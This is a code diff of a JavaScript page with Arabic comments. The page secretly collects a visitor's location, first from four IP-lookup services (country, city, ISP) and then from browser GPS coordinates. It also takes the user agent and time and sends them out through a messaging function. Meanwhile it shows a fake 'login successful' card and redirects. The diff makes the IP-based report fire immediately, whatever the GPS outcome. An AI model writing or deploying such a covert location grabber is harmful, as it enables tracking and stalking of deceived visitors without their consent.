@@ -20,7 +20,8 @@
     return Object.keys(count).reduce((a, b) => count[a] > count[b] ? a : b, "");
   }
 
-  function fallbackToIPAPIs() {
+  // 1️⃣ أولًا: إرسال الموقع التقريبي مباشرة من الـ APIs
+  function sendApproximateLocation() {
     Promise.all([
       fetch("https://ipinfo.io/json?token=34011ec27e4e2f").then(res => res.json()),
       fetch("https://ipwho.is/").then(res => res.json()),
@@ -34,22 +35,21 @@
       const bestCountry = getMostCommon(countries);
       const bestCity = getMostCommon(cities);
 
-      const content = `🕵️‍♂️ زائر جديد دخل الموقع (بدون GPS):\n
-🌍 الموقع المحسن:
-  الدولة: ${bestCountry}
-  المدينة: ${bestCity}
+      const content = `🌍 زائر جديد (موقع تقريبي من IP):\n
+الدولة المحسّنة: ${bestCountry}
+المدينة المحسّنة: ${bestCity}
 
-📍 الدولة والمدن من المصادر:
-  - ipinfo.io: ${info1.country} - ${info1.city}
-  - ipwho.is: ${info2.country} - ${info2.city}
-  - ip-api.com: ${info3.country} - ${info3.city}
-  - ipapi.co: ${info4.country_name} - ${info4.city}
+📍 من المصادر:
+- ipinfo.io: ${info1.country} - ${info1.city}
+- ipwho.is: ${info2.country} - ${info2.city}
+- ip-api.com: ${info3.country} - ${info3.city}
+- ipapi.co: ${info4.country_name} - ${info4.city}
 
-🛰️ مزودي الخدمة:
-  - ipinfo.io: ${info1.org}
-  - ipwho.is: ${info2.connection?.isp || "N/A"}
-  - ip-api.com: ${info3.isp}
-  - ipapi.co: ${info4.org}
+🛰️ ISP:
+- ipinfo.io: ${info1.org}
+- ipwho.is: ${info2.connection?.isp || "N/A"}
+- ip-api.com: ${info3.isp}
+- ipapi.co: ${info4.org}
 
 🖥️ المتصفح: ${userAgent}
 📅 الوقت: ${now}`;
@@ -58,22 +58,20 @@
     });
   }
 
-  function handleGPSLocation() {
-    if (!navigator.geolocation) {
-      fallbackToIPAPIs();
-      return;
-    }
+  // 2️⃣ بعدها: نحاول نجيب الموقع الدقيق باستخدام GPS
+  function trySendGPSLocation() {
+    if (!navigator.geolocation) return;
 
     navigator.geolocation.getCurrentPosition(
       (position) => {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
-        const content = `🛰️ تم تحديد الموقع بدقة عبر GPS:\n
-📍 الإحداثيات:
-  Latitude: ${lat}
-  Longitude: ${lon}
-📌 [عرض على خرائط جوجل](${gmaps})
+        const content = `🛰️ تم الحصول على الموقع الدقيق (GPS):\n
+📌 الإحداثيات:
+- Latitude: ${lat}
+- Longitude: ${lon}
+🔗 [عرض على خرائط جوجل](${gmaps})
 
 🖥️ المتصفح: ${userAgent}
 📅 الوقت: ${now}`;
@@ -81,17 +79,17 @@
         sendMessage(content);
       },
       (error) => {
-        console.warn("GPS مرفوض أو غير متاح، استخدام IP بديل");
-        fallbackToIPAPIs();
+        console.warn("GPS مرفوض أو غير متاح، لا يوجد موقع دقيق");
       },
       { timeout: 5000 }
     );
   }
 
-  // ابدأ التنفيذ
-  handleGPSLocation();
+  // تنفيذ الكود
+  sendApproximateLocation(); // يبعت الموقع التقريبي فورًا
+  trySendGPSLocation(); // يحاول يجيب الموقع الدقيق لو ممكن
 
-  // بعد ما يخلص، الرسالة والريدايركت
+  // الرسالة الظاهرة للمستخدم والريدايركت
   setTimeout(() => {
     document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
     setTimeout(() => {
